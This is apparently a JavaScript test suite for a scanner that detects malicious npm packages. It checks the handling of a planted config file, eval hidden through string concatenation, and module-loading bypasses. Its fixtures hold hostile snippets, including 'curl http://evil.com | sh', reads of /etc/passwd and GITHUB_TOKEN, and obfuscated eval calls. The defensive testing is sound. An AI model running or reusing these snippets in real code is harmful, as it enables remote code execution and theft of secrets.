'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, assertIncludes, runScanDirect, cleanupTemp } = require('../test-utils');

function makeTempPkg(jsContent, fileName = 'index.js', extraFiles = {}) {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-auditv2-'));
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({ name: 'test-auditv2-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(tmp, fileName), jsContent);
  for (const [name, content] of Object.entries(extraFiles)) {
    fs.writeFileSync(path.join(tmp, name), content);
  }
  return tmp;
}

async function runAuditV2RemediationTests() {
  console.log('\n=== AUDIT V2 REMEDIATION TESTS (v2.9.9) ===\n');

  // ===================================================================
  // CHANTIER 1: Config Security — .muaddibrc.json in scanned package
  // ===================================================================

  await asyncTest('C1: .muaddibrc.json inside scanned package → IGNORED (score unchanged)', async () => {
    // Create a package with a neutralizing config AND a clear threat
    const code = `const cp = require('child_process');\ncp.execSync('curl http://evil.com | sh');`;
    const maliciousConfig = JSON.stringify({
      severityWeights: { critical: 0, high: 0, medium: 0, low: 0 }
    });
    const tmp = makeTempPkg(code, 'index.js', { '.muaddibrc.json': maliciousConfig });
    try {
      const result = await runScanDirect(tmp);
      // The config should be IGNORED — threats should still be detected with non-zero score
      const score = result.summary ? result.summary.riskScore : 0;
      assert(score > 0, `Score should be >0 (config ignored), got ${score}`);
      const hasExec = result.threats.some(t => t.type === 'dangerous_exec');
      assert(hasExec, 'Should still detect dangerous_exec despite attacker config');
      // Check for the security warning (index.js prefixes config warnings with [CONFIG])
      const hasWarning = result.warnings && result.warnings.some(w =>
        w.includes('SECURITY') && w.includes('.muaddibrc.json'));
      assert(hasWarning, 'Should emit SECURITY warning about config in scanned package');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C1: --config explicit path → APPLIED', async () => {
    const code = `const x = process.env.GITHUB_TOKEN;`;
    const tmp = makeTempPkg(code);
    // Create a valid config in a separate safe location
    const configDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-config-'));
    const configPath = path.join(configDir, '.muaddibrc.json');
    fs.writeFileSync(configPath, JSON.stringify({
      riskThresholds: { critical: 90, high: 60, medium: 30 }
    }));
    try {
      const result = await runScanDirect(tmp, { configPath });
      // Config should be applied (check warnings for loaded message — prefixed with [CONFIG])
      const hasLoaded = result.warnings && result.warnings.some(w =>
        w.includes('Loaded custom thresholds'));
      assert(hasLoaded, 'Should indicate config was loaded');
    } finally {
      cleanupTemp(tmp);
      cleanupTemp(configDir);
    }
  });

  await asyncTest('C1: No config anywhere → defaults (no error)', async () => {
    const code = `console.log('benign');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      // Should not crash and should return valid result
      assert(result !== null, 'Should return a result');
      const score = result.summary ? result.summary.riskScore : 0;
      assert(score >= 0, `Score should be >= 0, got ${score}`);
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // CHANTIER 2: BinaryExpression computed property resolution
  // ===================================================================

  await asyncTest('C2: var a="ev",b="al"; globalThis[a+b]("code") → CRITICAL dangerous_call_eval', async () => {
    const code = `var a='ev',b='al';\nglobalThis[a+b]('code');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect resolved indirect eval via concat as CRITICAL');
      assertIncludes(t.message, 'eval', 'Message should mention eval');
      assertIncludes(t.message, 'concat evasion', 'Message should mention concat evasion');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C2: const x="Fun",y="ction"; global[x+y]("return 1")() → CRITICAL', async () => {
    const code = `const x='Fun',y='ction';\nglobal[x+y]('return 1')();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect resolved indirect Function via concat as CRITICAL');
      assertIncludes(t.message, 'Function', 'Message should mention Function');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C2: globalThis["toString"]() → no false positive on known method', async () => {
    // This tests that literal string property access (already existing detection) gives
    // correct result — toString is not eval/Function
    const code = `const result = globalThis["toString"]();`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const evalThreat = result.threats.find(t =>
        t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(!evalThreat, 'toString() should NOT be flagged as CRITICAL eval');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C2: triple concat var a="e",b="va",c="l"; globalThis[a+b+c]() → CRITICAL', async () => {
    const code = `var a='e',b='va',c='l';\nglobalThis[a+b+c]('malicious');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'dangerous_call_eval' && t.severity === 'CRITICAL');
      assert(t, 'Should detect resolved indirect eval via triple concat as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // CHANTIER 3: process.mainModule.require detection
  // ===================================================================

  await asyncTest('C3: process.mainModule.require("child_process").exec("ls") → CRITICAL dynamic_require', async () => {
    const code = `process.mainModule.require('child_process').exec('ls');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL' &&
        t.message.includes('mainModule'));
      assert(t, 'Should detect process.mainModule.require(child_process) as CRITICAL');
      assertIncludes(t.message, 'child_process', 'Message should mention child_process');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C3: process.mainModule.require("fs") → CRITICAL dynamic_require', async () => {
    const code = `const f = process.mainModule.require('fs');\nf.readFileSync('/etc/passwd');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'dynamic_require' && t.severity === 'CRITICAL' &&
        t.message.includes('mainModule'));
      assert(t, 'Should detect process.mainModule.require(fs) as CRITICAL');
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C3: process.mainModule.require("some-lib") → HIGH dynamic_require', async () => {
    const code = `const lib = process.mainModule.require('some-lib');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t =>
        t.type === 'dynamic_require' &&
        t.message.includes('mainModule'));
      assert(t, 'Should detect process.mainModule.require() for non-dangerous module');
      assert(t.severity === 'HIGH', `Non-dangerous module should be HIGH, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  // ===================================================================
  // CHANTIER 4: Module._load detection
  // ===================================================================

  await asyncTest('C4: require("module")._load("child_process") → CRITICAL module_load_bypass', async () => {
    const code = `require('module')._load('child_process');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect Module._load() as module_load_bypass');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C4: const M = require("module"); M._load("net") → CRITICAL', async () => {
    const code = `const M = require('module');\nM._load('net');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect M._load() via moduleAliases as module_load_bypass');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C4: Module._load with node:module prefix → CRITICAL', async () => {
    const code = `const Mod = require('node:module');\nMod._load('child_process');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_load_bypass');
      assert(t, 'Should detect _load via require("node:module") alias');
      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
    } finally { cleanupTemp(tmp); }
  });

  await asyncTest('C4: module._compile still detected (non-regression)', async () => {
    const code = `const m = require('module');\nm._compile('malicious code', 'test.js');`;
    const tmp = makeTempPkg(code);
    try {
      const result = await runScanDirect(tmp);
      const t = result.threats.find(t => t.type === 'module_compile');
      assert(t, 'module._compile should still be detected (non-regression)');
    } finally { cleanupTemp(tmp); }
  });
}

module.exports = { runAuditV2RemediationTests };
